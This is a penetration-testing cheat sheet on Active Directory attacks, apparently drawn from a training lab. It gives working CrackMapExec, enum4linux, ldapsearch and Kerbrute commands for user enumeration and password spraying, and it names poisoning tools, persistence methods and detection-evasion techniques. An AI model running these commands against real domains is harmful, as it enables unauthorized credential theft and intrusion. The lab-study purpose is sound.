# Active Directory Privilege Escalation

## Active Directory Attacks

Active Directory is the primary identity management service in Windows environments. Proper enumeration and understanding of Active Directory components is crucial for finding attack vectors.

### Initial Enumeration

Initial enumeration involves identifying domain controllers, exploring network resources, and discovering basic domain information.

#### Discovering Domain Controllers

* Network scanning for standard DC ports (53, 88, 389, 445)
* DNS queries for SRV records
* LDAP queries

#### Basic Domain Information

* Domain name and NetBIOS name
* Domain functional level
* Trust relationships

### NBT-NS Poisoning

#### NBT-NS Poisoning from Linux

NetBIOS Name Service poisoning involves responding to NetBIOS name resolution requests to capture credentials or redirect users.

Tools:

* Responder
* ntlmrelayx
* Impacket suite

#### NBT-NS Poisoning from Windows

Similar to Linux-based poisoning but using Windows-native tools or specialized utilities:

* Inveigh
* PowerShell scripts for LLMNR/NBT-NS poisoning

### User Enumeration & Password Policies

Understanding user accounts and password policies is critical for planning authentication attacks.

#### Retrieving Password Policies

```bash
# Using CrackMapExec
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Using enum4linux
enum4linux -P 172.16.5.5

# Using LDAP search
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

#### Enumerating Users

```bash
# Using enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient
rpcclient -U "" -N 172.16.5.5

# Using CrackMapExec
crackmapexec smb 172.16.5.5 --users

# With valid credentials
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

# Using LDAP search
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Using Kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Password Spraying Attacks

Password spraying involves trying a small set of common passwords against many user accounts to avoid account lockouts.

#### Windows Password Spraying

```bash
# Using CrackMapExec for SMB password spraying
crackmapexec smb 172.16.5.5 -u users.txt -p 'Welcome1' --continue-on-success

# Using Kerbrute for Kerberos password spraying
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt 'Welcome1'
```

### Post-Compromise Enumeration

After gaining initial access, deeper enumeration helps identify privilege escalation paths.

#### Domain Information

* Group Policy Objects
* Domain trusts
* Sites and services

#### User and Group Details

* Group memberships
* Account privileges
* Service accounts

#### Computer Objects

* Operating systems
* Installed software
* Security configurations

### Active Directory Privilege Escalation

Common privilege escalation paths in Active Directory:

1. Kerberoasting
2. AS-REP Roasting
3. DCSync attacks
4. Abuse of Group Policy
5. ACL/DACL misconfigurations
6. Resource-based constrained delegation

### Persistence Mechanisms

Ways to maintain access in Active Directory environments:

1. Golden/Silver tickets
2. Domain Controller synchronization rights
3. DSRM password modification
4. Skeleton key malware
5. Custom SSP
6. ACL modifications

### Detection Evasion

Techniques to avoid detection during Active Directory attacks:

1. Operational security practices
2. Avoid noisy tools and commands
3. Living off the land techniques
4. Limiting lateral movement
5. Alternative authentication methods
